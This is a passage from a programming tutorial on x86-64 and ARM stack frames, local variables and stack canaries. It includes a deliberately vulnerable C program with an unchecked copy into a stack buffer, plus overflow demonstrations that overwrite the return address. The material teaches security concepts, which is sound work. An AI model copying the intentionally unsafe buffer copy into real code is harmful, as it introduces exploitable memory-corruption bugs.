<p>I would say that if you do not find this to be really cool… then you are reading the wrong tutorial <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<p>Note that if we decide to use a different solution to deal with our parameters (using the stack or a different set of registers) this won’t work… because we will not be using the GNU/Linux System V ABI and our function will not be compatible with the system it is intended to be used with… However, from another asm function we can call other functions in any way we want… it is just that it will not play nicely with tools like C compilers as we have just seen.</p>
<h2><a name="p-59270-the-function-prologue-and-epilogue-7" class="anchor" href="https://d.clarkee.co.uk#p-59270-the-function-prologue-and-epilogue-7"></a>The Function Prologue and Epilogue</h2>
<p>We already know how to call a function (some code somewhere in memory) and we have already made a decision on how to get data in and out. This is enough when you work in assembly or with very simple functions, but for higher level languages we usually need a few more things.</p>
<p>These are some examples:</p>
<ul>
<li>We will usually need some local variables. These variables will only exists within our function and will disappear after the <code>RET</code> instruction… or at least, their values will not be valid any more.</li>
<li>For languages like C++, the local variables may be objects. In general, destroying an object implies the execution of the so-called destructor… that is just another name for a function that has to be executed before returning.</li>
<li>We may need to be able to write re-entrant code in order to write recursive functions</li>
</ul>
<p>What this means is that, for higher level languages, we usually have to do some additional things when entering and leaving a function. In general, all this is generated by the compiler and for application programmers it does not matter at all. However, if you are reversing some code generated from a high level language you will be exposed to these constructors/structures.</p>
<p>The code that is executed when entering the function is known as <em>Function Prologue</em>, and the code executed when leaving a function is known as <em>Function Epilogue</em>. Let’s dive a bit more on this.</p>
<h2><a name="p-59270-minimal-prologue-and-epilogue-the-stack-frame-8" class="anchor" href="https://d.clarkee.co.uk#p-59270-minimal-prologue-and-epilogue-the-stack-frame-8"></a>Minimal Prologue and Epilogue. The Stack Frame</h2>
<p>In the simplest case, a C function prologue and epilogue will look like this:</p>
<pre data-code-wrap="Assembly"><code class="lang-Assembly">	push rbp
	mov  rbp, rsp
	sub  rsp, 0x10
	; PUSH registers used locally
        (... FUNCTION BODY ...)
	; POP Registers used locally
	mov rsp, rbp
	pop rbp
	ret
</code></pre>
<p>You will see code like this all over the place when reversing applications. So, let’s invest some time understanding this concept.</p>
<p>The first three instructions are the function prologue. What the compiler usually do is to copy the current stack pointer in an auxiliary register. For Intel platforms this is usually <code>RBP</code> where <code>BP</code> stands for <strong>Base Pointer</strong> (and <code>R</code> roughly means we are working with 64bits, <code>EBP</code> is the 32bits version and <code>BP</code> the 16bits version). This register is the one that defines the so called <strong>Stack Frame</strong>. We will get to this in a sec.</p>
<p>Let’s look at the code in detail. We get into the function and the stack contains the return address as we described before. Then we store the current value of <code>RBP</code>… just because we are going to modify it and we want to restore it before returning, so the calling function does not have to care about changes to that register. Also, think about the case when a function is called from inside another function…</p>
<p>Then, we store in <code>RBP</code>, our base register, the current top of the stack. And after that, we increase the stack (remember it grows down on Intel platforms so we have to substract a value to grow the stack). For this specific function, the stack will look like this (supposing parameters are passed on registers - 64bits Intel-)</p>
<pre><code>ADDR
X      Start    --&gt;  Return Address
       RBP      --&gt;  RBP
                --&gt;  4 bytes
                --&gt;  4 bytes
                --&gt;  4 bytes
X-24   RSP      --&gt;  4 bytes
</code></pre>
<p>The figure above shows the stack after the function prologue. In this example, the stack area going from the return address to the current value of the Stack Pointer is the so called stack frame for this function. OK, some books or authors may consider it slightly different, but what it is important is the concept. Note that if the ABI requires to push the parameters in the stack, those parameters will also be part of the function stack frame (they will be placed before the return address)… well, as I said, depends on who is writing about it.</p>
<p>So, the stack frame, is a chunk of the stack that contains all the information required by a function to work. This is very convenient. If we just call now another function within this function, a new stack frame will be added to the stack. When the function returns, the stack gets cleaned and the previous stack frame is just there. This way we can call multiple functions (even the same one) many times and keep the local variables of each invocation unmodified.</p>
<p>To finish this, let’s take a look to the function epilogue. It just restore the stack pointer and the <code>RBP</code> base pointer, leaving the stack ready for executing <code>RET</code> and effectively getting rid of all local storage used by the function (the local variables).</p>
<p>Note that the <code>sub esp, 0x10</code> in the prologue is the equivalent to do 4 <code>pops</code> in the stack… Substracting a values from <code>RSP</code> allows us to allocate memory in the stack in a very easy way. The fact that the <code>RBP</code> base pointer holds the address of the original stack pointer allows us to release/free all that local memory just restoring the stack pointer. And we do that copying <code>RBP</code> back into <code>RSP</code>. See the stack figure above.</p>
<h2><a name="p-59270-do-we-need-the-stack-frame-9" class="anchor" href="https://d.clarkee.co.uk#p-59270-do-we-need-the-stack-frame-9"></a>Do we need the stack frame?</h2>
<p>As we have seen, defining a stack frame makes our lives easier in the general case, however, specially when the functions are small it actually introduces a little overhead (both on execution time and also on memory) and does not provide much more. Also, not using a stack frame frees a register (<code>RBP</code> for intel processors) that can be used for operations in the function and therefore improve performance.</p>
<p>Sometimes, it may be interesting to get rid of it. and this can be done using the compiler flag <code>-fomit-frame-pointer</code>. Just for illustration process, these is the <code>func1</code> in our previous example with and width out frame pointer:</p>
<pre><code class="lang-auto">WITH FRAME POINTER                          | WITHOUT FRAME POINTER
55           push   rbp                     |
48 89 e5     mov    rbp,rsp                 |
c6 45 ff 10  mov    BYTE PTR [rbp-0x1],0x10 | c6 44 24 ff 10  mov    BYTE PTR [rsp-0x1],0x10
0f b6 45 ff  movzx  eax,BYTE PTR [rbp-0x1]  | 0f b6 44 24 ff  movzx  eax,BYTE PTR [rsp-0x1]
83 c0 01     add    eax,0x1                 | 83 c0 01        add    eax,0x1
5d           pop    rbp                     |
c3           ret                            | c3              ret

</code></pre>
<p>As you can see the saving is not that much.</p>
<h2><a name="p-59270-other-things-that-happens-when-you-leave-a-function-10" class="anchor" href="https://d.clarkee.co.uk#p-59270-other-things-that-happens-when-you-leave-a-function-10"></a>Other things that happens when you leave a function</h2>
<p>What we have described is the very basics on what is going on under the hood when calling a function. However, depending on different factors a lot more things may happen.</p>
<p>We had already mentioned the C++ case. All those objects you create in your functions just does not go away magically. They are usually created in the stack and when the method returns, the stack has to be traversed to find out the locally created objects and call the appropriate destructors. This process is known generically as  <a href="https://en.wikipedia.org/wiki/Call_stack#Unwinding" title="unwinding" rel="noopener nofollow ugc">unwinding</a>. So… calling a C++ function/methods, despite of how simple the code may look like, can be doing quite a bunch of things under the hood and be way less efficient than a longer raw C version.</p>
<p>Also stack protections (we will talk about this later) requires extra code that needs to be executed when the function ends to detected corruptions in the stack.</p>
<h2><a name="p-59270-local-variables-11" class="anchor" href="https://d.clarkee.co.uk#p-59270-local-variables-11"></a>Local Variables</h2>
<p>The last piece to understand the stack structure when a function is called are the local variables. Almost any decent programming language support local variables. A local variable is one that only exist in a given context, usually within a function. Compare this to a so-called global variable that is accessible from anywhere in the program at any time… Ah… yes… sure… global variables are evil (end of mandatory disclaimer).</p>
<p>So, the easiest way to create variables local to a function is to store them in the function stack frame. We had already seen how this is created for each function call, and therefore, anything we allocate in there will remain there for the function associated to it. So local variables are just allocated making room in the stack. In other words, they are declared changing the <em>Stack Pointer</em>.</p>
<p>To see this, and introduce the next concept we are going to learn, let’s play with a simple hands-on example. Pay attention. What we are going to do right now, is something you can always do when you are not fully sure about something… just write a test and see what happens. This technique is invaluable during the learning process and you should use it as much as you can.</p>
<p>In this case, we are going to declare a few functions in a C program, with different local variables and see what happens. Yes sure, to declare a local variable in C you just need to declare the variable inside the function you want the variable to be local to…</p>
<pre data-code-wrap="C"><code class="lang-C">int func1 (void) {
  unsigned char a = 0x10;
  return a+1;
}
int func2 (void) {
  int a = 0x10;
  unsigned char b = 0x20;
  int c = 0x30;

  return a+b+c;
}

void func3 (int a, int b) {
  char str[100];

}
int main() {
}
</code></pre>
<p>Nothing really exciting. We declared three functions with some local variables of different types. Let’s look at the assembly:</p>
<h2><a name="p-59270-func1-12" class="anchor" href="https://d.clarkee.co.uk#p-59270-func1-12"></a><code>func1</code></h2>
<p>This is how <code>func1</code> looks like:</p>
<pre><code class="lang-auto">$ objdump -Mintel -d local_vars | grep -A7 "&lt;func1&gt;"
00000000000005fa &lt;func1&gt;:
 5fa:   55                      push   rbp
 5fb:   48 89 e5                mov    rbp,rsp
 5fe:   c6 45 ff 10             mov    BYTE PTR [rbp-0x1],0x10
 602:   0f b6 45 ff             movzx  eax,BYTE PTR [rbp-0x1]
 606:   83 c0 01                add    eax,0x1
 609:   5d                      pop    rbp
 60a:   c3                      ret

</code></pre>
<p>We can see the function prologue (storing <code>rbp</code> and making it point to the stack). Then we see that <code>mov</code> instruction, copying the value <code>0x10</code> into <code>[rbp-0x1]</code>… That is our local variable. <code>RBP</code> will point to the top of to stack, as the stack grows to lower address (goes down) for intel machines, the next empty position in the stack is <code>rbp - 1</code>.</p>
<p>During reverse engineering code, you will have to identify the different local variables in the function. Most decent tools nowadays allows you to give names to these <code>rbp</code> offsets, or in other words, to name the local variables in the function you are reversing. That helps a lot during the process.</p>
<p>However here, we are missing a component that is common in functions but that, for this simple function, gcc have just thrown away because it is not needed. The peculiarity of this function is that it is a so-called leaf function. This means that this function does not call any other function. The practical effect of this is that we do not need to allocate memory in the stack for our local variables.</p>
<p>Stack memory is usually allocated adjusting the Stack Pointer. In this case we just use the stack freely as… no other function will be executed that could overwrite our local variable values.</p>
<p>Let’s just quickly modify <code>func1</code> in our program like this:</p>
<pre><code class="lang-auto">int func1 (void) {
  unsigned char a = 0x10;
  a += func2 ();
  return a+1;
}
</code></pre>
<p>When compiling you will get a warning about <code>func2</code> not defined. You shall always honour warnings like those, but in this case, the prototype of the function actually matches the default prototype assigned  by gcc and everything is going to be fine. Anyway, be free to add <code>func2</code> prototype above <code>func1</code>  definition to remove the warning.</p>
<p>Now, we can take a look to the new code generated for <code>func1</code>.</p>
<pre><code class="lang-auto">4$ objdump -Mintel -d local_vars | grep -A11 "&lt;func1&gt;:"
000000000000066a &lt;func1&gt;:
 66a:   55                      push   rbp
 66b:   48 89 e5                mov    rbp,rsp
 66e:   48 83 ec 10             sub    rsp,0x10
 672:   c6 45 ff 10             mov    BYTE PTR [rbp-0x1],0x10
 676:   b8 00 00 00 00          mov    eax,0x0
 67b:   e8 0c 00 00 00          call   68c &lt;func2&gt;
 680:   00 45 ff                add    BYTE PTR [rbp-0x1],al
 683:   0f b6 45 ff             movzx  eax,BYTE PTR [rbp-0x1]
 687:   83 c0 01                add    eax,0x1
 68a:   c9                      leave
 68b:   c3                      ret
</code></pre>
<p>Now we can see the instruction <code>sub rsp, 0x10</code> that allocates 16 bytes in the stack before calling <code>func2</code>. Why 16 byte?.. Well, for 64bits intel processors the stack has to be aligned to blocks of 16 bytes. This is apparently related to the biggest register size that can be pushed into the stack (SSE extension). In this case we just need 1 byte (our variable is at <code>rbp-0x1</code>) but we have to allocate 16 at least.</p>
<p>The <code>leave</code> instruction is a high level procedure exit function complementary to <code>enter</code>. <code>leave</code> actually implements our function epilogue in one instruction… sets <code>RSP</code> to <code>RBP</code> and pop <code>RBP</code>. If you check the Intel manual for <code>enter</code> instruction you will see that this instruction does a lot… what roughly means that it is slow. Looks like compiler writers know that and they just generate the required instructions for each case. That’s why you won’t see <code>enter</code> very often on binaries.</p>
<h2><a name="p-59270-func2-13" class="anchor" href="https://d.clarkee.co.uk#p-59270-func2-13"></a><code>func2</code></h2>
<p>Now, let’s look at <code>func2</code>:</p>
<pre><code class="lang-auto">$ objdump -Mintel -d local_vars | grep -A12 "&lt;func2&gt;"
000000000000067b &lt;func2&gt;:
 67b:   55                      push   rbp
 67c:   48 89 e5                mov    rbp,rsp
 67f:   c7 45 f8 10 00 00 00    mov    DWORD PTR [rbp-0x8],0x10
 686:   c6 45 f7 20             mov    BYTE PTR [rbp-0x9],0x20
 68a:   c7 45 fc 30 00 00 00    mov    DWORD PTR [rbp-0x4],0x30
 691:   0f b6 55 f7             movzx  edx,BYTE PTR [rbp-0x9]
 695:   8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]
 698:   01 c2                   add    edx,eax
 69a:   8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
 69d:   01 d0                   add    eax,edx
 69f:   5d                      pop    rbp
 6a0:   c3                      ret

</code></pre>
<p>The first thing we notice is that the compiler has reordered the variables. We declared and <code>int</code>, then a <code>char</code> and then another <code>int</code>, but the variables are stored slightly differently:</p>
<pre><code>         STACK CONTENT   RBP Index
           RET Addr
RBP-&gt;       RBP
            c1	           -1
            c2             -2
		    c3             -3
		    c4             -4  [rbp - 0x4] &lt;- int  (32bits)
			a1             -5
			a2             -6
			a3             -7
			a4             -8  [rbp - 0x8] &lt;- int  (32bits)
			b              -9  [rbp - 0x9] &lt;- char (8 bits)
</code></pre>
<p>As we can see, the <code>char</code> variable (that uses just 1 byte) is stored at the very end of the stack, this is probably the compiler trying to ensure memory alignment and optimising the use of stack memory. Anyway, the interesting thing here is than the compiler can re-order the local variables as it thinks is better (check <a href="https://0x00sec.org/t/simple-buffer-overflow-demonstration/1131/4" rel="noopener nofollow ugc">this</a>).</p>
<h2><a name="p-59270-then-func3-14" class="anchor" href="https://d.clarkee.co.uk#p-59270-then-func3-14"></a>Then <code>func3</code></h2>
<p>Now it is time to look into <code>func3</code>. Things are going to get more interesting now:</p>
<pre><code class="lang-auto">00000000000006a1 &lt;func3&gt;:
 6a1:   55                      push   rbp
 6a2:   48 89 e5                mov    rbp,rsp
 6a5:   48 81 ec 90 00 00 00    sub    rsp,0x90
 6ac:   89 bd 7c ff ff ff       mov    DWORD PTR [rbp-0x84],edi
 6b2:   89 b5 78 ff ff ff       mov    DWORD PTR [rbp-0x88],esi
 6b8:   64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
 6bf:   00 00
 6c1:   48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
 6c5:   31 c0                   xor    eax,eax
 6c7:   90                      nop
 6c8:   48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
 6cc:   64 48 33 04 25 28 00    xor    rax,QWORD PTR fs:0x28
 6d3:   00 00
 6d5:   74 05                   je     6dc &lt;func3+0x3b&gt;
 6d7:   e8 64 fe ff ff          call   540 &lt;__stack_chk_fail@plt&gt;
 6dc:   c9                      leave
 6dd:   c3                      ret
</code></pre>
<p>The first thing we see just before the function prologue is an update of the <code>RSP</code> pointer. This is effectively the declaration of the array of our function (actually of all the local variables at once). Updating <code>RSP</code> is actually equivalent, as we have briefly mentioned already, to reserve a chunk of the stack because this part won’t be used by <code>pushes</code> or <code>pops</code> or <code>calls</code> within the function (well, unless something goes really crazy in the program and we … overwrite the stack… but we are getting to that in a while).</p>
<p>So, as the stack grows downwards (to the lower address), subtracting a value for RSP is the way to allocate memory in the stack.</p>
<blockquote>
<p>As you can see local variables are allocated/freed just decreasing/increasing <code>SP</code>… This means that they are not initialised automatically. In other words, this means that when you call a function many times one after the other, the same area of the stack will be used again and again to hold the function stack frame. If you do not initialise your variables yourself, they will hold values from previous invocations and you get those strange situations of functions that fail the first time but then they work fine… It is not witchcraft is just variable initialisation…</p>
</blockquote>
<p>Now the following question arise… Why is the compiler allocating <code>0x90</code> (144 bytes) instead of the 120 that we asked for?.. Well, it is actually allocating the right size. if you pay attention to the rest of the code those <code>0x90</code> bytes includes a 8 bytes value at <code>[rbp-0x8]</code> (we will come back to this in a sec) and two values at <code>[rbp-0x84]</code> and <code>[rbp-0x88]</code> to store the parameters passed to the function (do you remember? par1 → rdi/edi par2 rsi/esi). So 144-8-8-8 = 120.</p>
<p>Note however that for a 64bits machine the stack pointer needs to be always aligned to 16 bytes (yes bytes), in order to accommodate values for SSE registers. So, just keep in mind that sometimes the compiler will just allocate more stack space than needed in order to maintain its alignment and also it will pad small data types to also keep the memory properly aligned.</p>
<blockquote>
<p>Try to recompile the program with different values for the buffer size… specially odd numbers and see the result. Alternative re-read the section about <code>func1</code></p>
</blockquote>
<h1><a name="p-59270-buffer-overflows-15" class="anchor" href="https://d.clarkee.co.uk#p-59270-buffer-overflows-15"></a>Buffer overflows</h1>
<p>So now we have got all the pieces to understand what is a buffer overflow and how it can be used to modify the normal program flow… which at the end is what an attacker is looking for, a way to execute arbitrary code, or at least some code that can provide some advantage or access to the machine.</p>
<p>Let’s get back for a sec to our <code>func3</code> and how the stack is laid out after the function prologue is executed.</p>
<pre><code>X+0x8            Ret Address
X        RBP  -&gt; RBP
X-0x8            Some data here
(...)
X-0x90   RSP  -&gt; str (func3 buffer)
</code></pre>
<p>So, basically, if we can write more than <code>0x90</code> bytes into <code>str</code> we will start writing beyond the function stack frame and eventually we could overwrite the return address and therefore control the flow of the program. Actually we could overwrite the stack frame of the function that called the buggy one.</p>
<p>Note that our <code>func3</code> does nothing and therefore there is no way to overwrite the buffer. Actually, we can only overwrite the buffer when the programmer have made a mistake developing the program. A so-called bug.</p>
<p>Let’s make a mistake so we can learn more about how the stack can get smashed and its consequences.</p>
<h2><a name="p-59270-a-vulnerable-program-16" class="anchor" href="https://d.clarkee.co.uk#p-59270-a-vulnerable-program-16"></a>A vulnerable program</h2>
<p>So, let’s use a new program where we can actually overwrite the stack and also, let’s take that chance to dump the stack content for better realise what is going on.</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;

#define SIZE 13
#define OFF  12

void func (char *a) {
  long  first=0x1122334455667788;
  char s[50];
  char *d=s;
  int i;
  long *p;

  p = (&amp;first) + OFF;
  for (i = 0; i &lt; SIZE; p--,i++) printf ("%p -&gt; %0lx\n", p, *p);
  while (*d++ = *a++);

  p = (&amp;first) +OFF;
  printf ("---------\n");
  for (i = 0; i &lt; SIZE; p--,i++) printf ("%p -&gt; %0lx\n", p, *p);
  
}

int main (int argc, char *argv[]) {
  printf ("Return address: %p\n----\n", &amp;&amp;the_end);
  func (argv[1]);
 the_end:
  return 0;
}
</code></pre>
<p>So the program just dumps the stack… overwrites the buffer with the parameter passed through the command line, and them dumps the stack again, before leaving the function.</p>
<p><em>Note:I manually adjusted the values of <code>SIZE</code> and <code>OFF</code> to just dump the interesting part for this example</em></p>
<p>Let’s see what happens when we run it:</p>
<pre><code class="lang-auto">$ ./vul `perl -e "print 'A'x80;"`
Return address: 0x56330f66a833     &lt;-----------------------+
----                                                       |
0x7ffd9b5eab88 -&gt; 56330f66a833      &lt;- Return Address -----+
0x7ffd9b5eab80 -&gt; 7ffd9b5eaba0      &lt;- RBP
0x7ffd9b5eab78 -&gt; 2f0fef490dd7a400
0x7ffd9b5eab70 -&gt; 7f2c512559f0
0x7ffd9b5eab68 -&gt; 56330f66a88d
0x7ffd9b5eab60 -&gt; 1
0x7ffd9b5eab58 -&gt; f0b2ff
0x7ffd9b5eab50 -&gt; 7ffd9b5eabb8
0x7ffd9b5eab48 -&gt; 7f2c51247660
0x7ffd9b5eab40 -&gt; 9                &lt;- Buffer
0x7ffd9b5eab38 -&gt; 7ffd9b5eab38
0x7ffd9b5eab30 -&gt; 7ffd9b5eab40
0x7ffd9b5eab28 -&gt; 1122334455667788 &lt;- first
---------
0x7ffd9b5eab88 -&gt; 4141414141414141 &lt;- Return address overwritten
0x7ffd9b5eab80 -&gt; 4141414141414141
0x7ffd9b5eab78 -&gt; 4141414141414141
0x7ffd9b5eab70 -&gt; 4141414141414141
0x7ffd9b5eab68 -&gt; 4141414141414141
0x7ffd9b5eab60 -&gt; 4141414141414141
0x7ffd9b5eab58 -&gt; 4141414141414141
0x7ffd9b5eab50 -&gt; 4141414141414141
0x7ffd9b5eab48 -&gt; 4141414141414141
0x7ffd9b5eab40 -&gt; 4141414141414141
0x7ffd9b5eab38 -&gt; 7ffd9b5eab38
0x7ffd9b5eab30 -&gt; 7ffd9b5eab91
0x7ffd9b5eab28 -&gt; 1122334455667788
*** stack smashing detected ***: &lt;unknown&gt; terminated
Aborted
</code></pre>
<p><em>NOTE:You will get completely different addresses in the first column. That’s normal</em></p>
<p>Yes, as you can see we can overwrite the return address in the stack so we could control the application flow whenever the function returns. Right?</p>
<p>Unfortunately things are not that easy nowadays and, as you can see, instead of crashing (because there is no code at address <code>0x4141414141414141</code>) we get a nice message informing us that the stack has been <em>Smashed</em>…</p>
<blockquote>
<p>When trying to exploit a program, instead of using a sequence of <code>A</code>s as we did here, you better use a <a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence" rel="noopener nofollow ugc">De Bruijn Sequence</a> as it has interesting properties to find relevant offsets in memory</p>
</blockquote>
<h2><a name="p-59270-canaries-17" class="anchor" href="https://d.clarkee.co.uk#p-59270-canaries-17"></a>Canaries</h2>
<p>The reason why our program didn’t crashed is because it is compiled with stack protection, or in other words the application uses canaries to detect changes in the stack. Let’s see how this works checking the code of this function.</p>
<pre><code class="lang-auto">0000000000006fa &lt;func&gt;:
 6fa:   55                      push   rbp
 6fb:   48 89 e5                mov    rbp,rsp
 6fe:   48 83 ec 70             sub    rsp,0x70
 702:   48 89 7d 98             mov    QWORD PTR [rbp-0x68],rdi
 706:   64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
 70d:   00 00
 70f:   48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
(...)
 7e3:   48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
 7e7:   64 48 33 04 25 28 00    xor    rax,QWORD PTR fs:0x28
 7ee:   00 00
 7f0:   74 05                   je     7f7 &lt;func+0xfd&gt;
 7f2:   e8 c9 fd ff ff          call   5c0 &lt;__stack_chk_fail@plt&gt;
 7f7:   c9                      leave
 7f8:   c3                      ret

</code></pre>
<p>So, at the beginning of the function we can see how the function stores the value of <code>fs:0x28</code> into local variable <code>[rbp-0x8]</code>… that is the first available position in the stack after the return address and the <code>rbp</code> register.</p>
<p>The function does its stuff and at the end, it checks this local variable and compares it with the original value at <code>fs:0x28</code>. If the values doesn’t mach, a special function named <code>__stack_chk_fail</code> is called. This is the function that shows the message in the console when we smash the canary.</p>
<p>Note that this code is only generated when we have a buffer in the function. Check back our <code>func1</code> and <code>func2</code> in the previous example… no canary… because, in principle we cannot override the stack without overflowing a buffer.</p>
<p>So, with this information, let’s annotate once again the output of this simple program, but this time adjusting the sequence of <code>A</code> to the value that gets the canary check function executed:</p>
<pre><code class="lang-auto">$ ./vul `perl -e "print 'A'x57;"`
Return address: 0x559e7cf9b833       &lt;-------------------------+
----                                                           |
0x7ffd1a347e68 -&gt; 559e7cf9b833       &lt;--- Return Address ------+
0x7ffd1a347e60 -&gt; 7ffd1a347e80       &lt;-- RBP
0x7ffd1a347e58 -&gt; 4c77054d1b6f8100   &lt;-- Canary
0x7ffd1a347e50 -&gt; 7f2d1ac4c9f0
0x7ffd1a347e48 -&gt; 559e7cf9b88d
0x7ffd1a347e40 -&gt; 1
0x7ffd1a347e38 -&gt; f0b2ff
0x7ffd1a347e30 -&gt; 7ffd1a347e98
0x7ffd1a347e28 -&gt; 7f2d1ac3e660
0x7ffd1a347e20 -&gt; 9                  &lt;-- Buffer
0x7ffd1a347e18 -&gt; 7ffd1a347e18
0x7ffd1a347e10 -&gt; 7ffd1a347e20
0x7ffd1a347e08 -&gt; 1122334455667788   &lt;-- first
---------
0x7ffd1a347e68 -&gt; 559e7cf9b833
0x7ffd1a347e60 -&gt; 7ffd1a347e80
0x7ffd1a347e58 -&gt; 4c77054d1b6f0041  &lt;- First byte of canary overwritten
0x7ffd1a347e50 -&gt; 4141414141414141
0x7ffd1a347e48 -&gt; 4141414141414141
0x7ffd1a347e40 -&gt; 4141414141414141
0x7ffd1a347e38 -&gt; 4141414141414141
0x7ffd1a347e30 -&gt; 4141414141414141
0x7ffd1a347e28 -&gt; 4141414141414141
0x7ffd1a347e20 -&gt; 4141414141414141
0x7ffd1a347e18 -&gt; 7ffd1a347e18
0x7ffd1a347e10 -&gt; 7ffd1a347e5a
0x7ffd1a347e08 -&gt; 1122334455667788
*** stack smashing detected ***: &lt;unknown&gt; terminated
Aborted

</code></pre>
<p>To finish with this topic, just say that the initialisation code of the program (do you remember all that code that gets executed before <code>main</code> and that we got rid of it in a previous instalment?) generates a canary as a random number that gets stored at <code>fs:0x28</code>. <code>fs</code> is a segment register. We will not talk about this right now, just consider this a special memory address.</p>
<h2><a name="p-59270-exploiting-buffer-overflows-18" class="anchor" href="https://d.clarkee.co.uk#p-59270-exploiting-buffer-overflows-18"></a>Exploiting buffer overflows</h2>
<p>Actually this section is just going to be a suggestion for you to read about the topic on the internet. There are plenty of great tutorials out there explaining how to exploit buffer overflows and how to circumvent canaries or deal with <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" rel="noopener nofollow ugc">ASLR</a> or <a href="https://en.wikipedia.org/wiki/Position-independent_code#PIE" rel="noopener nofollow ugc">PIE binaries</a> (like the one in our example).</p>
<p>After all, this is a programming course, and the objective is for you to understand how to build programs and also how programs are built. Hope that at least, now you know enough about this topic to easily follow any exploitation tutorial out there and update it to make it work for your system… yes… things usually just doesn’t work out of the box and knowing this details will help you figure out why a lot faster.</p>
<p>… that was easier than I expected <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<h1><a name="p-59270-the-arm-case-19" class="anchor" href="https://d.clarkee.co.uk#p-59270-the-arm-case-19"></a>The ARM Case</h1>
<p>Now, that we know everything about the stack on Intel processors, let’s take a look to what happens on other platforms. let’s start with our beloved ARM. We are going to recompile the three function test program we used earlier in this section and look inside it.</p>
<pre><code class="lang-auto">$ arm-linux-gnueabi-gcc -o local_vars-arm local_vars.c
$ arm-linux-gnueabi-objdump -d local_vars-arm
</code></pre>
<p>As we did before, let’s go function by function analysing the code generated:</p>
<h2><a name="p-59270-func1-arm-20" class="anchor" href="https://d.clarkee.co.uk#p-59270-func1-arm-20"></a><code>func1</code> ARM</h2>
<p>Before fully understand this code we need to learn a little bit of basics about ARM registers. As it happens with the Intel processor, ARM has some special registers. In principle, ARM names the registers as <code>RX</code> where <code>X</code> is a number running from 0 to 15 for the 32bits architecture (64bits uses other names). However a bunch of those have special meanings:</p>
<pre><code>REGISTER  ALIAS  DESCRIPTION
R11       FP     Frame Pointer
R12       IP     Intra Procedural Call
R13       SP     Stack Pointer
R14       LR     Link Pointer
R15       PC     Program Counter
</code></pre>
<p>From those special ones, the following are relevant for our current discussion:</p>
<ul>
<li><code>R11/FP</code>. This register is used as frame pointer in the same way that <code>RBP</code> on the Intel platform.</li>
<li><code>R13/SP</code>. This is the stack pointer and works exactly like the <code>RSP</code> Intel register</li>
<li><code>R14/LR</code>. This is called the Link Register. Whenever a function is called this register contains the <em>Return Address</em>. As you may remember, for intel processors, this value is stored in the stack before transferring the control to the function. ARM, PowerPC, Pa-RISC and SPARC uses this other approach of storing the value in a register</li>
<li><code>R15/PC</code>. This is the instruction pointer or program counter and we already know everything about it.</li>
</ul>
<p>With this information, lets take a look</p>
<pre><code class="lang-auto">00010468 &lt;func1&gt;:
   10468:       e52db004        push    {fp}            ; (str fp, [sp, #-4]!)
   1046c:       e28db000        add     fp, sp, #0
   10470:       e24dd00c        sub     sp, sp, #12
   10474:       e3a03010        mov     r3, #16
   10478:       e54b3005        strb    r3, [fp, #-5]
   1047c:       e55b3005        ldrb    r3, [fp, #-5]
   10480:       e2833001        add     r3, r3, #1
   10484:       e1a00003        mov     r0, r3
   10488:       e28bd000        add     sp, fp, #0
   1048c:       e49db004        pop     {fp}            ; (ldr fp, [sp], #4)
   10490:       e12fff1e        bx      lr

</code></pre>
<p>The first things the function does is to store in the stack the current frame pointer… in other words, the frame pointer of the function calling us. Then this function frame pointer is initialised to the current Stack Pointer value plus 0 in this case. We will see an example later when this is done differently, but for now we are just setting up our frame pointer to point to the top of of the stack.</p>
<p>Then we find the <code>sub sp,sp #12</code> that makes some room in the stack… I’ll let up to you to figure out what this 12 value comes from… It is room for 3 words… it doesn’t make much sense to me at first glance… so I smell some fun ahead in order to figure this out.</p>
<p>Then we have the main function code.. the code looks funny but if we enable optimisations we will not see most of the interesting things. Anyway, it allows us to see how ARM access local variables… remember the <code>[rbp-0xNN]</code> for Intel processors?. Sure, so taking into account that <code>fp</code> is the new <code>RBP</code>, <code>strb r3, [fp, #-5]</code> stores register <code>r3</code> on the stack frame position 5, and the <code>ldrb</code> loads it from that same position. So this is how local variables looks like for ARM.</p>
<p>Finally the value to be returned is stored in <code>r0</code> and the stack restored.</p>
<p>Note that, instead of using a <code>RET</code> instruction taking the return value from the stack, the code branches to the position indicated by the link register that, if you remember, was updated with the proper return address, when calling the function.</p>
<p>We will skip now <code>func2</code> as it doesn’t give us much more information and let’s go straight into <code>func3</code>.</p>
<h2><a name="p-59270-func3-for-arm-21" class="anchor" href="https://d.clarkee.co.uk#p-59270-func3-for-arm-21"></a><code>func3</code> for ARM</h2>
<p>Let’s take a look to the assembly:</p>
<pre><code class="lang-auto">000104dc &lt;func3&gt;:
   104dc:       e92d4800        push    {fp, lr}
   104e0:       e28db004        add     fp, sp, #4
   104e4:       e24dd090        sub     sp, sp, #136    ; 0x88
   104e8:       e50b0090        str     r0, [fp, #-144] ; 0xffffff70
   104ec:       e50b1094        str     r1, [fp, #-148] ; 0xffffff6c
   104f0:       e59f3028        ldr     r3, [pc, #40]   ; 10520 &lt;func3+0x44&gt;
   104f4:       e5933000        ldr     r3, [r3]
   104f8:       e50b3008        str     r3, [fp, #-8]
   104fc:       e1a00000        nop                     ; (mov r0, r0)
   10500:       e59f3018        ldr     r3, [pc, #24]   ; 10520 &lt;func3+0x44&gt;
   10504:       e51b2008        ldr     r2, [fp, #-8]
   10508:       e5933000        ldr     r3, [r3]
   1050c:       e1520003        cmp     r2, r3
   10510:       0a000000        beq     10518 &lt;func3+0x3c&gt;
   10514:       ebffff8b        bl      10348 &lt;__stack_chk_fail@plt&gt;
   10518:       e24bd004        sub     sp, fp, #4
   1051c:       e8bd8800        pop     {fp, pc}
   10520:       00020f08        .word   0x00020f08

</code></pre>
